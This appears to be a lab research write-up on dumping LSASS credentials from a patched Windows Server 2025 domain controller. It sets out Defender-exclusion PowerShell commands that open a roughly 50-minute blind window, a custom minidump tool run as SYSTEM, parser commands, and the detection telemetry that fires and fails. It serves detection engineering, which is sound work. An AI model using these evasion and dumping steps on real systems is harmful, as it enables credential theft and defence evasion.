# Windows Server 2025 UBR 32690: Parser Boundary & Credential Extraction Under Defender

**Series:** AD-Lab-Research | Windows Credential Extraction  
**Target:** Windows Server 2025 — Build 26100.32690 (KB5082063, April 14 2026)  
**Domain:** badsuccessor.local  
**Author:** Osher Jacobs  

> **Disclaimer:** This research was conducted in an isolated lab environment on systems I own and control. All techniques are presented for defensive and detection engineering purposes. Credential values are redacted. Do not reproduce against systems you do not own or have explicit written authorisation to test.

---

## Overview

This vector documents LSASS credential extraction against a fully patched Windows Server 2025 domain controller (UBR 32690 — current April 2026 security baseline), with Defender Real-Time Protection active, full Sysmon instrumentation, and ELK telemetry.

The central finding: **the April 2026 patch cycle broke public parser tooling without hardening the underlying access model.** The observable detection surface did not change in this experiment.

> *"2025 — New and breakable."*

---

## Environment

| Component | Detail |
|---|---|
| Target | WIN-A33E3D6C61G — Windows Server 2025, PDC |
| Domain | badsuccessor.local |
| UBR | 26100.32690 (KB5082063 — April 14 2026) |
| Defender sigs | 1.449.353.0 |
| Attacker | Kali Linux |
| Telemetry | Sysmon v15.20 + Winlogbeat 8.19.14 → ELK 8.19 |

---

## Attack Chain

### Step 1 — Defender Exclusion Window

Defender RTP active. A transient folder exclusion was added immediately before dump execution and removed immediately after exfiltration — creating a blind window limited to the dump duration (~50 minutes under active memory scanning).

```powershell
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
# launch curio.exe
# [dump completes ~50 min]
Remove-MpPreference -ExclusionPath "C:\Windows\Temp"
```

### Step 2 — LSASS Dump via curio.exe

Custom C# MiniDumpWriteDump implementation via P/Invoke to `dbghelp.dll`. Executed as SYSTEM via remote scheduled task shell. Output: `C:\Windows\Temp\out2.dmp` (~135MB).

### Step 3 — Exfiltration

Dump exfiltrated to analyst machine via SMB.

### Step 4 — Parser Comparison

Both tools run against the same dump on an offline analyst machine.

---

## Finding 1 — pypykatz 0.6.13 Fails on UBR 32690

```
pypykatz lsa minidump out32690PATCH.dmp
```

**Result:**

```
msv_exception_please_report
Memory address 0x001a0018 not in process memory space
entry.Domaine.read_string
```

**Observation:** Failure is isolated to the MSV struct walk on UBR 32690 in this test. WDIGEST and DPAPI parse successfully on the same dump.

---

## Finding 2 — KvcForensic Succeeds

**Tool:** [KvcForensic](https://github.com/wesmar/KvcForensic) by Marek Wesołowski (WESMAR) — MIT License  

```
KvcForensic.exe --analyze-dump --input out32690PATCH.dmp --format both
```

**Result:**

```
[+] AES-128 decryption active   sessions: 19

== LogonSession ==
authentication_id 573021 (8be5d)
username Administrator
domainname BADSUCCESSOR

    == MSV ==
        NT: <redacted>
        SHA1: <redacted>
        DPAPI: <redacted>

    == Kerberos ==
        TGT extracted (EncType 18, Kvno 2)

    == DPAPI ==
        masterkey: <redacted>
        sha1_masterkey: <redacted>

[*] 19 logon session(s) parsed.
```

**Observation:** KvcForensic is built to handle current Server 2025 builds (26100+). Same dump, full extraction.

---

## Comparative Table

| Tool | UBR 32690 | MSV NT hash | Notes |
|---|---|---|---|
| pypykatz 0.6.13 | ❌ FAIL | Not obtained | MSV struct walk fails on UBR 32690 in this test |
| KvcForensic (wesmar) | ✅ SUCCESS | `<redacted>` | Handles current Server 2025 builds |

Same dump. Same patch level. Same access model. Different tooling outcome.

---

## Finding 3 — Sysmon EID 10 Not Observed

Sysmon v15.20 configured with permissive ProcessAccess rule:

```xml
<ProcessAccess onmatch="include">
  <TargetImage condition="end with">lsass.exe</TargetImage>
</ProcessAccess>
```

**No EID 10 generated for curio.exe.**

curio.exe was executed as SYSTEM via remote scheduled task (goexec/tsch). Despite a permissive Sysmon ProcessAccess configuration with no GrantedAccess or user filters, no EID 10 was observed. The exact mechanism is not confirmed.

No Sysmon EID 10 observed for this execution path on Server 2025 UBR 32690 under this configuration.

---

## Detection Telemetry

### Detection Reality

Sysmon EID 10: not observed (SYSTEM scheduled task execution path, UBR 32690)  
LSASS access signal: not observed  
Dump signal: not observed  

What fires:

- EID 5007 — Exclusion added
- EID 5007 — Exclusion removed
- ~50-minute blind window between events

EID 10 here is execution-path dependent — not a universal invariant.

That's the detection surface.

**EID 4662 — DCSync (footnote)**

```kql
event.code: "4662"
AND winlog.event_data.AccessMask: "0x100"
AND winlog.event_data.OperationType: "Object Access"
AND NOT winlog.event_data.SubjectUserName: *$
```

Fires reliably on secretsdump DRSUAPI replication. Unaffected by parser tooling — operates at protocol layer, not artifact layer. 227 alerts generated per secretsdump execution (rule cap hit). Recommend grouping by `winlog.event_data.SubjectLogonId` to reduce alert volume.

### What does not fire

| Signal | Status | Reason |
|---|---|---|
| Sysmon EID 10 (lsass handle open) | ❌ | Not observed in this execution path |
| Defender memory scan block | ❌ | Exclusion window active during dump |

---

## Detection Summary

| Phase | Signal | Fires |
|---|---|---|
| Exclusion add | EID 5007 | ✅ |
| LSASS dump | Sysmon EID 10 | ❌ |
| Exclusion remove | EID 5007 | ✅ |
| Parser (offline) | — | No signal (offline operation) |
| DCSync (footnote) | EID 4662 | ✅ |

The dump produced no Sysmon EID 10 in this execution context. The only on-host signals are the exclusion window bookends. A defender with EID 5007 alerting has a narrow window to respond before exfiltration completes.

---

## Key Observation

The April 2026 patch broke pypykatz. It did not break the underlying memory access model, the MiniDumpWriteDump API, or the DRSUAPI replication protocol. Defenders who treat "tool X doesn't work anymore" as a hardening signal are measuring the wrong thing.

KvcForensic closed the tooling gap within the same patch cycle. The observable detection surface did not change in this experiment.

---

## Tools Referenced

- [KvcForensic](https://github.com/wesmar/KvcForensic) — Marek Wesołowski (WESMAR), MIT License, 2026
- pypykatz 0.6.13 — Tamas Jos, BSD License
- impacket secretsdump — Fortra, Apache 2.0
- Sysmon v15.20 — Microsoft Sysinternals

---

*Vector 7 | Vector 7b | **Vector 7c** | Vector 8 (upcoming)*


<img width="1881" height="1075" alt="ALERTS" src="https://github.com/user-attachments/assets/4923c4ed-c808-4b65-ab9e-fd796fdf642f" />

<img width="1869" height="975" alt="attackredacted" src="https://github.com/user-attachments/assets/ed88aa94-5de4-4dd3-a39f-3047866a3a38" />

<img width="666" height="107" alt="Dump0KB" src="https://github.com/user-attachments/assets/ece51004-69c0-4390-b9bf-5b03e78e3982" />


<img width="721" height="292" alt="DUMP1946" src="https://github.com/user-attachments/assets/fd107879-bbf6-43e5-9ef3-c9a7d8013f8a" />


<img width="1200" height="689" alt="KVMFORENSICTOOL" src="https://github.com/user-attachments/assets/03629f1d-a72c-4a1f-867e-bf3d7dec807f" />


<img width="1863" height="895" alt="dumpredacted" src="https://github.com/user-attachments/assets/38f0c49f-2692-42e2-8f8f-695809bec8d3" />


<img width="1876" height="951" alt="DCPWN" src="https://github.com/user-attachments/assets/3635d8d1-c6f8-4c4e-b969-3751f966f565" />










